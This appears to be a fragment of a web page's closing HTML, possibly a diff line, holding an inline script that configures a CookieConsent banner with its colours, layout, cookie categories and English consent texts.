+<script>CookieConsent.run({"palette":{"popup":{"background":"#000"},"button":{"background":"#f1d600"}},"guiOptions":{"consentModal":{"layout":"box","position":"bottom right","equalWeightButtons":true,"flipButtons":false},"preferencesModal":{"layout":"box","position":"right","equalWeightButtons":false,"flipButtons":false}},"categories":{"necessary":{"readOnly":true},"functionality":{},"analytics":{}},"language":{"default":"en","autoDetect":"browser","translations":{"en":{"consentModal":{"title":"Hello traveler, it's cookie time!","description":"🍪 This site uses cookies to serve you the best experience—no crumbs left behind! Want to know what cookies really are? Check out this easy-to-understand cookie explanation. And for the legal nitty-gritty, here’s our website cookie policy to keep you in the loop! 🚀\n","acceptAllBtn":"Accept all","acceptNecessaryBtn":"Reject all","showPreferencesBtn":"Manage preferences","footer":"<a href=\"#link\">Privacy Policy</a>\n<a href=\"/terms-and-conditions/\">Terms and conditions</a>\n"},"preferencesModal":{"title":"Consent Preferences Center","acceptAllBtn":"Accept all","acceptNecessaryBtn":"Reject all","savePreferencesBtn":"Save preferences","closeIconLabel":"Close modal","serviceCounterLabel":"Service|Services","sections":[{"title":"Cookie Usage","description":"We use cookies to make your visit smoother, faster, and tailored just for you. Cookies help us remember your preferences, improve site performance, and deliver personalized content while keeping things secure and user-friendly.\n"},{"title":"Strictly Necessary Cookies <span class=\"pm__badge\">Always Enabled</span>","description":"These cookies are essential for the website to function properly. They enable core features like security, page navigation, and access to secure areas. Without these, the site cannot operate correctly.\n","linkedCategory":"necessary"},{"title":"Functionality Cookies","description":"Functionality cookies remember your choices to provide a more personalized experience. For example, they save your language preference or login details so you don’t have to keep entering them each time.\n","linkedCategory":"functionality"},{"title":"Analytics Cookies","description":"Analytics cookies help us understand how visitors interact with our site by collecting information anonymously. This insight allows us to improve functionality, fix issues, and make the website better for you.\n","linkedCategory":"analytics"},{"title":"More information","description":"Please refer to our <a href='/pages/cookie-policy'>cookie policy</a> for full details on how we use cookies and your options to manage them.\n"}]}}}}})</script></body></html>
